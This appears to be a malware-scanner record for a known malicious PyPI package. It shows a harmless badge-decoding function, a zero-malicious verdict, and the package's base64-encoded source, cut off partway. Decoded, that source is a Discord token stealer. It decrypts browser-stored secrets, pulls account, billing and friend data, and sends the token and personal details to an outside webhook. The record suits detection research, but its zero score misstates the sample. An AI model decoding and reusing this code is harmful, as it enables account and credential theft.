statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/plutotestingagain/0.0.0/plutotestingagain-0.0.0-py3-none-any/main.py
  contents:
  - name: G3tB4dg31
    score: 0.0
    code: |-
      def G3tB4dg31(flags):
          if flags == 0: return ''

          Own3dB3dg4s = ''
          b4dg3List =  [
              {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
              {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
              {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
              {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
              {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<:brilliance:874750808338608199> "},
              {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<:bravery:874750808388952075> "},
              {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<:bughunter_1:874750808426692658> "},
              {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<:hypesquad_events:874750808594477056> "},
              {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
              {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
          ]
          for b4dg3 in b4dg3List:
              if flags // b4dg3["Value"] != 0:
                  Own3dB3dg4s += b4dg3["Emoji"]
                  flags = flags % b4dg3["Value"]

          return Own3dB3dg4s
    tokens: resume load_fast flags load_const INTEGER compare_op == pop_jump_if_false TO_NUMBER return_const load_const store_fast Own3dB3dg4s load_const STRING_LEN_S_ENT_HIGH load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const STRING_LEN_S_ENT_HIGH load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const Early_Supporter load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const House_Balance load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const STRING_LEN_S_ENT_HIGH load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const House_Bravery load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const STRING_LEN_S_ENT_HIGH load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const STRING_LEN_S_ENT_HIGH load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const STRING_LEN_S_ENT_HIGH load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map load_const STRING_LEN_S_ENT_HIGH load_const INTEGER load_const STRING_LEN_S_ENT_HIGH load_const build_const_key_map build_list store_fast b4dg3List load_fast b4dg3List get_iter for_iter TO_NUMBER store_fast b4dg3 load_fast flags load_fast b4dg3 load_const Value binary_subscr binary_op // load_const INTEGER compare_op != pop_jump_if_true TO_NUMBER jump_backward TO_NUMBER load_fast Own3dB3dg4s load_fast b4dg3 load_const Emoji binary_subscr binary_op += store_fast Own3dB3dg4s load_fast flags load_fast b4dg3 load_const Value binary_subscr binary_op % store_fast flags jump_backward TO_NUMBER end_for load_fast Own3dB3dg4s return_value
    hash: 4b9e8251b72358676db7395a2d5bda3857d237d161fa1084224a177566b6d7cc
sources:
  .repo_cache/malicious_repos/pypi_malregistry/plutotestingagain/0.0.0/plutotestingagain-0.0.0-py3-none-any/main.py: aW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUKZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0CmltcG9ydCByZQpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZApmcm9tIGN0eXBlcyBpbXBvcnQgd2luZGxsLCB3aW50eXBlcywgYnlyZWYsIGNkbGwsIFN0cnVjdHVyZSwgUE9JTlRFUiwgY19jaGFyLCBjX2J1ZmZlcgpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCmZyb20ganNvbiBpbXBvcnQgKgppbXBvcnQgdGltZQppbXBvcnQgc2h1dGlsCmZyb20gemlwZmlsZSBpbXBvcnQgWmlwRmlsZQppbXBvcnQgcmFuZG9tCmltcG9ydCByZQppbXBvcnQgc3VicHJvY2VzcwoKCgpob29rID0gImh0dHBzOi8vd2ViaG9vay53eXZlcm4ubG9sIgoKCkRFVEVDVEVEID0gRmFsc2UKCmRlZiBnM3QxcCgpOgogICAgaXAgPSAiTm9uZSIKICAgIHRyeToKICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgcmV0dXJuIGlwCgpyZXF1aXJlbWVudHMgPSBbCiAgICBbInJlcXVlc3RzIiwgInJlcXVlc3RzIl0sCiAgICBbIkNyeXB0by5DaXBoZXIiLCAicHljcnlwdG9kb21lIl0sCl0KZm9yIG1vZGwgaW4gcmVxdWlyZW1lbnRzOgogICAgdHJ5OiBfX2ltcG9ydF9fKG1vZGxbMF0pCiAgICBleGNlcHQ6CiAgICAgICAgc3VicHJvY2Vzcy5Qb3BlbihmIntleGVjdXRhYmxlfSAtbSBwaXAgaW5zdGFsbCB7bW9kbFsxXX0iLCBzaGVsbD1UcnVlKQogICAgICAgIHRpbWUuc2xlZXAoMykKCmltcG9ydCByZXF1ZXN0cwpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwoKbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKVGhyZWFkbGlzdCA9IFtdCgoKY2xhc3MgREFUQV9CTE9CKFN0cnVjdHVyZSk6CiAgICBfZmllbGRzXyA9IFsKICAgICAgICAoJ2NiRGF0YScsIHdpbnR5cGVzLkRXT1JEKSwKICAgICAgICAoJ3BiRGF0YScsIFBPSU5URVIoY19jaGFyKSkKICAgIF0KCmRlZiBHM3RENHQ0KGJsb2Jfb3V0KToKICAgIGNiRGF0YSA9IGludChibG9iX291dC5jYkRhdGEpCiAgICBwYkRhdGEgPSBibG9iX291dC5wYkRhdGEKICAgIGJ1ZmZlciA9IGNfYnVmZmVyKGNiRGF0YSkKICAgIGNkbGwubXN2Y3J0Lm1lbWNweShidWZmZXIsIHBiRGF0YSwgY2JEYXRhKQogICAgd2luZGxsLmtlcm5lbDMyLkxvY2FsRnJlZShwYkRhdGEpCiAgICByZXR1cm4gYnVmZmVyLnJhdwoKZGVmIENyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfYnl0ZXMsIGVudHJvcHk9YicnKToKICAgIGJ1ZmZlcl9pbiA9IGNfYnVmZmVyKGVuY3J5cHRlZF9ieXRlcywgbGVuKGVuY3J5cHRlZF9ieXRlcykpCiAgICBidWZmZXJfZW50cm9weSA9IGNfYnVmZmVyKGVudHJvcHksIGxlbihlbnRyb3B5KSkKICAgIGJsb2JfaW4gPSBEQVRBX0JMT0IobGVuKGVuY3J5cHRlZF9ieXRlcyksIGJ1ZmZlcl9pbikKICAgIGJsb2JfZW50cm9weSA9IERBVEFfQkxPQihsZW4oZW50cm9weSksIGJ1ZmZlcl9lbnRyb3B5KQogICAgYmxvYl9vdXQgPSBEQVRBX0JMT0IoKQoKICAgIGlmIHdpbmRsbC5jcnlwdDMyLkNyeXB0VW5wcm90ZWN0RGF0YShieXJlZihibG9iX2luKSwgTm9uZSwgYnlyZWYoYmxvYl9lbnRyb3B5KSwgTm9uZSwgTm9uZSwgMHgwMSwgYnlyZWYoYmxvYl9vdXQpKToKICAgICAgICByZXR1cm4gRzN0RDR0NChibG9iX291dCkKCmRlZiBEM2tyeXB0VjRsVTMoYnVmZiwgbWFzdGVyX2tleT1Ob25lKToKICAgIHN0YXJ0cyA9IGJ1ZmYuZGVjb2RlKGVuY29kaW5nPSd1dGY4JywgZXJyb3JzPSdpZ25vcmUnKVs6M10KICAgIGlmIHN0YXJ0cyA9PSAndjEwJyBvciBzdGFydHMgPT0gJ3YxMSc6CiAgICAgICAgaXYgPSBidWZmWzM6MTVdCiAgICAgICAgcGF5bG9hZCA9IGJ1ZmZbMTU6XQogICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfcGFzcwoKZGVmIEwwNGRSM3F1M3NUcyhtZXRob2RlLCB1cmwsIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOiAjIG1heCB0cnlzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoKICAgICAgICAgICAgICAgIGlmIGRhdGEgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgICAgICBlbGlmIGZpbGVzICE9ICcnOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDAgb3Igci5zdGF0dXNfY29kZSA9PSA0MTM6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgTDA0ZHVybDFiKGhvb2ssIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgaGVhZGVycyAhPSAnJzoKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcGFzcwoKZGVmIGdsb2JhbEluZm8oKToKICAgIGlwID0gZzN0MXAoKQogICAgdXMzcm40bTEgPSBvcy5nZXRlbnYoIlVTRVJOQU1FIikKICAgIGlwZGF0YW5vanNvbiA9IHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZ2VvbG9jYXRpb24tZGIuY29tL2pzb25wL3tpcH0iKSkucmVhZCgpLmRlY29kZSgpLnJlcGxhY2UoJ2NhbGxiYWNrKCcsICcnKS5yZXBsYWNlKCd9KScsICd9JykKICAgICMgcHJpbnQoaXBkYXRhbm9qc29uKQogICAgaXBkYXRhID0gbG9hZHMoaXBkYXRhbm9qc29uKQogICAgIyBwcmludCh1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2dlb2xvY2F0aW9uLWRiLmNvbS9qc29ucC97aXB9IikpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGNvbnRyeSA9IGlwZGF0YVsiY291bnRyeV9uYW1lIl0KICAgIGNvbnRyeUNvZGUgPSBpcGRhdGFbImNvdW50cnlfY29kZSJdLmxvd2VyKCkKICAgIHNlaGlyID0gaXBkYXRhWyJzdGF0ZSJdCgogICAgZ2xvYmFsaW5mbyA9IGYiOmZsYWdfe2NvbnRyeUNvZGV9OiAgLSBge3VzM3JuNG0xLnVwcGVyKCl9IHwge2lwfSAoe2NvbnRyeX0pYCIKICAgIHJldHVybiBnbG9iYWxpbmZvCgoKZGVmIFRSNnN0KEMwMGsxMyk6CiAgICAjIHNpbXBsZSBUcnVzdCBGYWN0b3Igc3lzdGVtCiAgICBnbG9iYWwgREVURUNURUQKICAgIGRhdGEgPSBzdHIoQzAwazEzKQogICAgdGltID0gcmUuZmluZGFsbCgiLmdvb2dsZS5jb20iLCBkYXRhKQogICAgIyBwcmludChsZW4odGltKSkKICAgIGlmIGxlbih0aW0pIDwgLTE6CiAgICAgICAgREVURUNURUQgPSBUcnVlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICBlbHNlOgogICAgICAgIERFVEVDVEVEID0gRmFsc2UKICAgICAgICByZXR1cm4gREVURUNURUQKICAgICAgICAKZGVmIEczdFVIUUZyMTNuZFModDBrM24pOgogICAgYjRkZzNMaXN0ID0gIFsKICAgICAgICB7Ik5hbWUiOiAnRWFybHlfVmVyaWZpZWRfQm90X0RldmVsb3BlcicsICdWYWx1ZSc6IDEzMTA3MiwgJ0Vtb2ppJzogIjw6ZGV2ZWxvcGVyOjg3NDc1MDgwODQ3MjgyNTk4Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMicsICdWYWx1ZSc6IDE2Mzg0LCAnRW1vamknOiAiPDpidWdodW50ZXJfMjo4NzQ3NTA4MDg0MzA4NzQ2NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdFYXJseV9TdXBwb3J0ZXInLCAnVmFsdWUnOiA1MTIsICdFbW9qaSc6ICI8OmVhcmx5X3N1cHBvcnRlcjo4NzQ3NTA4MDg0MTQxMTM4MjM+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CYWxhbmNlJywgJ1ZhbHVlJzogMjU2LCAnRW1vamknOiAiPDpiYWxhbmNlOjg3NDc1MDgwODI2NzI5MjY4Mz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JyaWxsaWFuY2UnLCAnVmFsdWUnOiAxMjgsICdFbW9qaSc6ICI8OmJyaWxsaWFuY2U6ODc0NzUwODA4MzM4NjA4MTk5PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJhdmVyeScsICdWYWx1ZSc6IDY0LCAnRW1vamknOiAiPDpicmF2ZXJ5Ojg3NDc1MDgwODM4ODk1MjA3NT4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0J1Z19IdW50ZXJfTGV2ZWxfMScsICdWYWx1ZSc6IDgsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8xOjg3NDc1MDgwODQyNjY5MjY1OD4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgeyJOYW1lIjogJ1BhcnRuZXJlZF9TZXJ2ZXJfT3duZXInLCAnVmFsdWUnOiAyLCdFbW9qaSc6ICI8OnBhcnRuZXI6ODc0NzUwODA4Njc4MzU0OTY0PiAifSwKICAgICAgICB7Ik5hbWUiOiAnRGlzY29yZF9FbXBsb3llZScsICdWYWx1ZSc6IDEsICdFbW9qaSc6ICI8OnN0YWZmOjg3NDc1MDgwODcyODY2NjE1Mj4gIn0KICAgIF0KICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0MGszbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIGZyaWVuZGxpc3QgPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9yZWxhdGlvbnNoaXBzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKICAgIHVocWxpc3QgPSAnJwogICAgZm9yIGZyaWVuZCBpbiBmcmllbmRsaXN0OgogICAgICAgIE93bjNkQjNkZzRzID0gJycKICAgICAgICBmbGFncyA9IGZyaWVuZFsndXNlciddWydwdWJsaWNfZmxhZ3MnXQogICAgICAgIGZvciBiNGRnMyBpbiBiNGRnM0xpc3Q6CiAgICAgICAgICAgIGlmIGZsYWdzIC8vIGI0ZGczWyJWYWx1ZSJdICE9IDAgYW5kIGZyaWVuZFsndHlwZSddID09IDE6CiAgICAgICAgICAgICAgICBpZiBub3QgIkhvdXNlIiBpbiBiNGRnM1siTmFtZSJdOgogICAgICAgICAgICAgICAgICAgIE93bjNkQjNkZzRzICs9IGI0ZGczWyJFbW9qaSJdCiAgICAgICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYjRkZzNbIlZhbHVlIl0KICAgICAgICBpZiBPd24zZEIzZGc0cyAhPSAnJzoKICAgICAgICAgICAgdWhxbGlzdCArPSBmIntPd24zZEIzZGc0c30gfCB7ZnJpZW5kWyd1c2VyJ11bJ3VzZXJuYW1lJ119I3tmcmllbmRbJ3VzZXInXVsnZGlzY3JpbWluYXRvciddfSAoe2ZyaWVuZFsndXNlciddWydpZCddfSlcbiIKICAgIHJldHVybiB1aHFsaXN0CgpkZWYgRzN0YjFsbDFuZyh0MGszbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdDBrM24sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICBiMWxsMW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBpZiBiMWxsMW5nanNvbiA9PSBbXTogcmV0dXJuICJgYGBOb25lYGBgIgoKICAgIGIxbGwxbmcgPSAiIgogICAgZm9yIG1ldGhvZGUgaW4gYjFsbDFuZ2pzb246CiAgICAgICAgaWYgbWV0aG9kZVsiaW52YWxpZCJdID09IEZhbHNlOgogICAgICAgICAgICBpZiBtZXRob2RlWyJ0eXBlIl0gPT0gMToKICAgICAgICAgICAgICAgIGIxbGwxbmcgKz0gIjpjcmVkaXRfY2FyZDoiCiAgICAgICAgICAgIGVsaWYgbWV0aG9kZVsidHlwZSJdID09IDI6CiAgICAgICAgICAgICAgICBiMWxsMW5nICs9ICI6cGFya2luZzogIgoKICAgIHJldHVybiBiMWxsMW5nCgoKZGVmIEczdEI0ZGczMShmbGFncyk6CiAgICBpZiBmbGFncyA9PSAwOiByZXR1cm4gJycKCiAgICBPd24zZEIzZGc0cyA9ICcnCiAgICBiNGRnM0xpc3QgPSAgWwogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8yJywgJ1ZhbHVlJzogMTYzODQsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICdWYWx1ZSc6IDUxMiwgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJpbGxpYW5jZScsICdWYWx1ZSc6IDEyOCwgJ0Vtb2ppJzogIjw6YnJpbGxpYW5jZTo4NzQ3NTA4MDgzMzg2MDgxOTk+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgJ1ZhbHVlJzogNjQsICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSHlwZVNxdWFkX0V2ZW50cycsICdWYWx1ZSc6IDQsICdFbW9qaSc6ICI8Omh5cGVzcXVhZF9ldmVudHM6ODc0NzUwODA4NTk0NDc3MDU2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICdWYWx1ZSc6IDIsJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQogICAgXQogICAgZm9yIGI0ZGczIGluIGI0ZGczTGlzdDoKICAgICAgICBpZiBmbGFncyAvLyBiNGRnM1siVmFsdWUiXSAhPSAwOgogICAgICAgICAgICBPd24zZEIzZGc0cyArPSBiNGRnM1siRW1vamkiXQogICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYjRkZzNbIlZhbHVlIl0KCiAgICByZXR1cm4gT3duM2RCM2RnNHMKCmRlZiBHM3RUMGs0bjFuZjkodDBrM24pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHQwazNuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgdXMzcmpzMG4gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIHVzM3JuNG0xID0gdXMzcmpzMG5bInVzZXJuYW1lIl0KICAgIGhhc2h0YWcgPSB1czNyanMwblsiZGlzY3JpbWluYXRvciJdCiAgICBlbTMxbCA9IHVzM3JqczBuWyJlbWFpbCJdCiAgICBpZGQgPSB1czNyanMwblsiaWQiXQogICAgcGZwID0gdXMzcmpzMG5bImF2YXRhciJdCiAgICBmbGFncyA9IHVzM3JqczBuWyJwdWJsaWNfZmxhZ3MiXQogICAgbjF0cjAgPSAiIgogICAgcGgwbjMgPSAiIgoKICAgIGlmICJwcmVtaXVtX3R5cGUiIGluIHVzM3JqczBuOiAKICAgICAgICBuaXRyb3QgPSB1czNyanMwblsicHJlbWl1bV90eXBlIl0KICAgICAgICBpZiBuaXRyb3QgPT0gMToKICAgICAgICAgICAgbjF0cjAgPSAiPGE6REVfQmFkZ2VOaXRybzo4NjUyNDI0MzM2OTI3NjIxMjI+IgogICAgICAgIGVsaWYgbml0cm90ID09IDI6CiAgICAgICAgICAgIG4xdHIwID0gIjxhOkRFX0JhZGdlTml0cm86ODY1MjQyNDMzNjkyNzYyMTIyPjxhOmF1dHJfYm9vc3QxOjEwMzg3MjQzMjE3NzE3ODYyNDA+IgogICAgaWYgInBoMG4zIiBpbiB1czNyanMwbjogcGgwbjMgPSBmJ3t1czNyanMwblsicGgwbjMiXX0nCgogICAgcmV0dXJuIHVzM3JuNG0xLCBoYXNodGFnLCBlbTMxbCwgaWRkLCBwZnAsIGZsYWdzLCBuMXRyMCwgcGgwbjMKCmRlZiBjaDFja1Q0azFuKHQwazNuKToKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkF1dGhvcml6YXRpb24iOiB0MGszbiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgfQogICAgdHJ5OgogICAgICAgIHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHVwbDA1ZFQ0azMxKHQwazNuLCBwYXRoKToKICAgIGdsb2JhbCBob29rCiAgICBnbG9iYWwgdGdta3gKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHVzM3JuNG0xLCBoYXNodGFnLCBlbTMxbCwgaWRkLCBwZnAsIGZsYWdzLCBuMXRyMCwgcGgwbjMgPSBHM3RUMGs0bjFuZjkodDBrM24pCgogICAgaWYgcGZwID09IE5vbmU6IAogICAgICAgIHBmcCA9ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDUwNDkyNTkzMTE0NDU2MTI0LzEwNTE0OTAzMjA5MjExNDUzODQvNzg2NzEzMTA2NjU4NDkyNDE2LndlYnAiCiAgICBlbHNlOgogICAgICAgIHBmcCA9IGYiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97aWRkfS97cGZwfSIKCiAgICBiMWxsMW5nID0gRzN0YjFsbDFuZyh0MGszbikKICAgIGI0ZGczID0gRzN0QjRkZzMxKGZsYWdzKQogICAgZnJpZW5kcyA9IEczdFVIUUZyMTNuZFModDBrM24pCiAgICBpZiBmcmllbmRzID09ICcnOiBmcmllbmRzID0gImBgYE5vIFJhcmUgRnJpZW5kc2BgYCIKICAgIGlmIG5vdCBiMWxsMW5nOgogICAgICAgIGI0ZGczLCBwaDBuMywgYjFsbDFuZyA9ICLwn5SSIiwgIvCflJIiLCAi8J+UkiIKICAgIGlmIG4xdHIwID09ICcnIGFuZCBiNGRnMyA9PSAnJzogbjF0cjAgPSAiYGBgTm9uZWBgYCIKCiAgICBkYXRhID0gewogICAgICAgICJjb250ZW50IjogZid7Z2xvYmFsSW5mbygpfSB8IGB7cGF0aH1gJywKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJjb2xvciI6IDAwMDAwMDAsCiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPGE6aHlwZXJOT1BQRVJTOjgyODM2OTUxODE5OTMwODM4OD4gVG9rZW46IiwKICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmImBgYHt0MGszbn1gYGAiLAogICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjw6bWFpbDo3NTAzOTM4NzA1MDc5NjY0ODY+IEVtYWlsOiIsCiAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJgYGB7ZW0zMWx9YGBgIiwKICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgIC